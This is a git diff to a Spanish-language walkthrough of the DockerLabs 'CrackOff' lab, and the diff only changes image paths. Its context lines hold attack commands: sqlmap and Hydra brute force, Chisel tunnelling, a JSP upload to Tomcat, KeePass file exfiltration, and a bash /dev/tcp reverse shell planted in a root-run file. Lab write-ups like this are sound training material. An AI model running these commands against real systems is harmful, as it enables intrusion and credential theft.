@@ -15,7 +15,7 @@ estado: "Completado"
 toc: true
 hide_title_image: true
 image:
-  path: /assets/images/posts/DockerLabs/crackoff/banner.png
+  path: /assets/img/posts/DockerLabs/crackoff/banner.png
 ---
 
 ##  1. Executive Summary (Resumen Ejecutivo)
@@ -68,7 +68,7 @@ xsltproc nmap.xml -o nmap.html
 # Exposición temporal del reporte para análisis remoto
 python3 -m http.server 4444
 ```
-![nmap](/assets/images/posts/DockerLabs/crackoff/nmap.png)
+![nmap](/assets/img/posts/DockerLabs/crackoff/nmap.png)
 
 ### 📊 Servicios Identificados
 
@@ -116,7 +116,7 @@ En la página principal, se detectó un campo de entrada donde se probó una car
 - **Resultado:** Aunque el bypass directo no comprometió la base de datos de inmediato, el comportamiento de la aplicación sugirió que el foco debía desplazarse hacia la gestión de servicios adicionales.
     
 
-![Web](/assets/images/posts/DockerLabs/crackoff/crack.png) 
+![Web](/assets/img/posts/DockerLabs/crackoff/crack.png) 
 
 ### Análisis de Servicio Adicional (FTP/Nota)
 
@@ -167,7 +167,7 @@ sqlmap -r request.txt --batch --dbs --risk=3 --level=5 --random-agent
 - `information_schema` / `performance_schema`
 Se guardo el contenido del request capturado en **burpsuite**.
 
-![Request Burpsuite](/assets/images/posts/DockerLabs/crackoff/burp.png)
+![Request Burpsuite](/assets/img/posts/DockerLabs/crackoff/burp.png)
 
 
 Algunos comandos SQLMAP
@@ -275,7 +275,7 @@ El ataque fue exitoso, identificando una credencial válida para el usuario **ro
 [22][ssh] host: 172.17.0.2   login: rosa   password: ultramegaverypasswordhack
 ```
 
-![Acces Rosa](/assets/images/posts/DockerLabs/crackoff/rosa.png)  
+![Acces Rosa](/assets/img/posts/DockerLabs/crackoff/rosa.png)  
 
 
 
@@ -305,13 +305,13 @@ El script resaltó varios puntos críticos en el sistema:
 
 Se identificaron posibles vulnerabilidades a nivel de Kernel que podrían permitir el salto directo a root.
 
-![suggest](/assets/images/posts/DockerLabs/crackoff/sugges.png)  
+![suggest](/assets/img/posts/DockerLabs/crackoff/sugges.png)  
 
 #### B. Análisis de Configuraciones y Permisos
 
 El reporte de LinPEAS detectó archivos sensibles accesibles por el usuario actual y configuraciones de servicios (como Tomcat y Apache) que exponen vectores de movimiento lateral.
 
-![Contenido](/assets/images/posts/DockerLabs/crackoff/php1.png)  
+![Contenido](/assets/img/posts/DockerLabs/crackoff/php1.png)  
 
 
 ```txt
@@ -329,7 +329,7 @@ Useful software
 ```
 
 
-![Ps Aux](/assets/images/posts/DockerLabs/crackoff/aux1.png)  
+![Ps Aux](/assets/img/posts/DockerLabs/crackoff/aux1.png)  
 
 ```txt
 Searching root files in home dirs (limit 30)                                                
@@ -374,7 +374,7 @@ chmod +x chisel
 ```
 
 La siguiente imagen muestra el establecimiento exitoso del túnel inverso mediante Chisel.
-![PortForwarding](/assets/images/posts/DockerLabs/crackoff/chisel.png)  
+![PortForwarding](/assets/img/posts/DockerLabs/crackoff/chisel.png)  
 
 
 ---
@@ -404,7 +404,7 @@ cd /tmp
 
 Con el acceso habilitado en `http://localhost:8080`, se confirmó la versión del servicio y se procedió a la validación de acceso al panel de gestión.
 
-![Tomcat version](/assets/images/posts/DockerLabs/crackoff/tomcat1.png)  
+![Tomcat version](/assets/img/posts/DockerLabs/crackoff/tomcat1.png)  
 
 ### 8.1. Ataque de Fuerza Bruta / Validación
 
@@ -415,7 +415,7 @@ Aunque se contaba con un dump previo de SQLMap, se utilizó **Hydra** para confi
 ```bash
 hydra -l alice -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-get /manager/html
 ```
-![Usuario Tomcat](/assets/images/posts/DockerLabs/crackoff/user1.png)  
+![Usuario Tomcat](/assets/img/posts/DockerLabs/crackoff/user1.png)  
 
 **Resultado de Autenticación** El ataque confirmó las credenciales filtradas anteriormente, permitiendo el acceso al **Tomcat Web Application Manager**. Este panel es el vector definitivo para lograr la ejecución remota de código (RCE).
 
@@ -477,7 +477,7 @@ curl -X PUT http://127.0.0.1:8080/pwn.jsp/ --data '<% out.println("pwned"); %>'
 
 Tras recibir la conexión reversa del archivo `shell.war`, se obtuvo una shell limitada. Para poder utilizar comandos interactivos (como `su`, `nano`, o el autocompletado con Tab), se procedió al tratamiento de la TTY.
 
-![chisel1](/assets/images/posts/DockerLabs/crackoff/burp.png)  
+![chisel1](/assets/img/posts/DockerLabs/crackoff/burp.png)  
 
 ### Tratamiento TTY y acceso al sistema
 
@@ -553,7 +553,7 @@ cat user.txt
 
 **User Flag:** `d099be3ff7be7294c9344daadebca767`
 
-![Acceso a Mario](/assets/images/posts/DockerLabs/crackoff/ls.png)  
+![Acceso a Mario](/assets/img/posts/DockerLabs/crackoff/ls.png)  
 
 #### Exfiltración de Base de Datos (KeePass)
 
@@ -563,7 +563,7 @@ Se identificó un archivo de base de datos de contraseñas de **KeePass** perten
 
 Se realizó la transferencia del archivo `.kdbx` a la máquina atacante para su posterior análisis _offline_ (Fuerza bruta con `keepass2john` y `john the ripper`).
 
-![KeePass](/assets/images/posts/DockerLabs/crackoff/keepass.png)  
+![KeePass](/assets/img/posts/DockerLabs/crackoff/keepass.png)  
 
 ### Acceso al usuario Alice. 
 Se obtuvo acceso mediante SSH utilizando credenciales previamente identificadas.
@@ -643,7 +643,7 @@ echo "bash -i >& /dev/tcp/172.17.0.2/4444 0>&1" > /opt/alice/boss
 
 ### Ejecución y Shell Obtenida
 
-![Acceso root](/assets/images/posts/DockerLabs/crackoff/root.png)
+![Acceso root](/assets/img/posts/DockerLabs/crackoff/root.png)
 
 
 
